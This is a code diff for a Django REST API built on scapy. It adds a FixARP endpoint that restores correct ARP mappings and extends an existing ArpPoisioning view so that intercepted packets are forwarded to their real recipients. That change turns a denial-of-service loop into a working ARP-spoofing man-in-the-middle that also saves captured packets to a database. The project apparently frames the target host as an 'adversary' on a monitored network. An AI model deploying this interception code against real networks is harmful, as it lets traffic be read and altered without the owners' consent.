@@ -99,6 +99,30 @@ def UpdateAlias(request):
     return Response(serializer.data)
 
 @api_view(['POST'])
+def FixARP(request):
+    print("fixing arp for ", request.data["mac_fix"])
+    fix_mac = request.data["mac_fix"]
+    fix_ip = request.data["ip_fix"]
+    gateway_ip = (request.data["gateway"])
+    gateway = Device.objects.get(ip=gateway_ip)
+    gateway_mac = (gateway.mac)
+    
+    # pdst = destination ip
+    # hwdst = destination mac
+    # psrc = source ip
+    # hwsrc = source mac
+    # op="who-has" makes it easier to read the ARP packet in wireshark
+
+    # This packet is sending an ARP request to the gateway saying the correct location of the MAC address I am trying to fix
+    fixARP_packet = scapy.ARP(op="who-has", pdst=gateway_ip, hwdst=gateway_mac, psrc=fix_ip, hwsrc=fix_mac)
+    scapy.send(fixARP_packet)
+
+    # This packet is sending an ARP request to the device I want to fix saying the correct location of the gateway
+    fixARP_packet = scapy.ARP(op="who-has", pdst=fix_ip, hwdst=fix_mac, psrc=gateway_ip, hwsrc=gateway_mac)
+    scapy.send(fixARP_packet)
+    return Response(status.HTTP_200_OK)
+
+@api_view(['POST'])
 def UpdateGateway(request):
     print(request.data['gateway'])
     dirname = os.path.dirname(__file__)
@@ -128,7 +152,7 @@ def ArpPoisioning(request):
     # op="who-has" makes it easier to read the ARP packet in wireshark
 
     try:
-        while True: # activate this to cause DOS on devices below
+        while True: 
 
             # This packet is sending an ARP request to the adversary saying that the computer this packet is being sent from is the default gateway
             adversaryARP_packet = scapy.ARP(op="who-has", pdst=adversary_ip, hwdst=adversary_mac, psrc=gateway_ip)
@@ -178,6 +202,18 @@ def ArpPoisioning(request):
                             new_packet.tcp_flag = TCP_flag
                         print("SAVING TO DATABASE")
                         new_packet.save()
+                
+                
+                # forward the packets the we are intercepting to the correct recipient
+                if(packet.getlayer(scapy.Ether).src == gateway_mac):
+                    # change destination MAC to adversary because we intercepted a packet going from the gateway to the adversary
+                    packet.getlayer(scapy.Ether).dst = adversary_mac
+                    scapy.send(packet)
+                elif(packet.getlayer(scapy.Ether).src == adversary_mac):
+                    # change destination MAC to gateway because we intercepted a packet going from the adversary to the gateway
+                    packet.getlayer(scapy.Ether).dst = gateway_mac
+                    scapy.send(packet)
+
 
 
                 
@@ -201,6 +237,7 @@ def ArpPoisioning(request):
 @api_view(['DELETE'])
 def DeleteDatabase(self):
     Device.objects.all().delete()
+    Packet.objects.all().delete()
     return Response(status=200)
 
 
